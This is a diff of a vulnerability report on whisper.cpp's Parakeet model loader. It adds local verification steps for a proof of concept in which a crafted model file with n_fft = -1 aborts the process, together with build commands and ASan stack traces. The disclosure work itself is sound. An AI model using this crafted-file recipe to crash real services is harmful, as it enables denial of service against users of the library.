@@ -68,7 +68,7 @@ When `n_fft` is negative, `resize()` receives the value widened to `size_t` (e.g
 
 ## Reproduction
 
-A self-contained generator and harness are attached. The generator writes a minimal Parakeet model file with `n_fft = -1`. The harness loads it through the public buffer entry point.
+A self-contained generator and harness are included in this repository. The generator writes a minimal Parakeet model file with `n_fft = -1`. The harness loads it through the public buffer entry point.
 
 The crafted file uses `n_loaded == 0` (no tensor data), which reaches the "empty model" path in `parakeet_model_load` (`parakeet.cpp:1461`) that returns `true`, so control reaches `mel_cache.init(n_fft)` at `parakeet.cpp:3114`.
 
@@ -111,7 +111,7 @@ def make_model(n_fft_value, filename):
 make_model(-1, "poc_nfft_neg1.bin")   # std::terminate at model load
 ```
 
-**Harness (`run_poc.cpp`):**
+**Harness (`run_poc.cpp`, included):**
 
 ```cpp
 #include <cstdio>
@@ -149,6 +149,35 @@ g++ -g -O0 -fsanitize=address run_poc.cpp -o run_poc \
     -Wl,-rpath,build/bin -Iinclude -Iggml/include
 
 LD_LIBRARY_PATH=build/bin ./run_poc poc_nfft_neg1.bin   # process aborts (std::terminate)
+```
+
+## Local verification
+
+I verified this PoC locally against upstream `ggml-org/whisper.cpp` commit `6fc7c33b` with the following steps:
+
+```sh
+git clone https://github.com/ggml-org/whisper.cpp.git
+cd whisper.cpp
+git checkout 6fc7c33b
+cmake -B build-parakeet-asan -DWHISPER_SANITIZE_ADDRESS=ON -DCMAKE_BUILD_TYPE=Debug
+cmake --build build-parakeet-asan --target parakeet -j
+cd path/to/CVE_Parakeet_PoC
+python3 make_poc_final.py
+g++ -g -O0 -fsanitize=address run_poc.cpp -o run_poc \
+    -L/path/to/whisper.cpp/build-parakeet-asan/bin -lparakeet -lggml -lggml-base -lggml-cpu \
+    -Wl,-rpath,/path/to/whisper.cpp/build-parakeet-asan/bin \
+    -I/path/to/whisper.cpp/include -I/path/to/whisper.cpp/ggml/include
+./run_poc poc_nfft_neg1.bin
+```
+
+The local run exited with status `134` (`SIGABRT`). The output showed `parakeet_model_load: n_fft = -1`, the empty-model warning, and then an uncaught `std::length_error` from `std::vector<float>::resize()` in `parakeet_mel_cache::init()`. The relevant verified stack frames were:
+
+```text
+#12 std::vector<float>::resize (__new_size=18446744073709551615)
+#13 parakeet_mel_cache::init (fft_size=-1)                  src/parakeet.cpp:482
+#14 parakeet_init_with_params_no_state                      src/parakeet.cpp:3114
+#15 parakeet_init_from_buffer_with_params_no_state          src/parakeet.cpp:3081
+#16 main                                                    run_poc.cpp:14
 ```
 
 ## Observed result
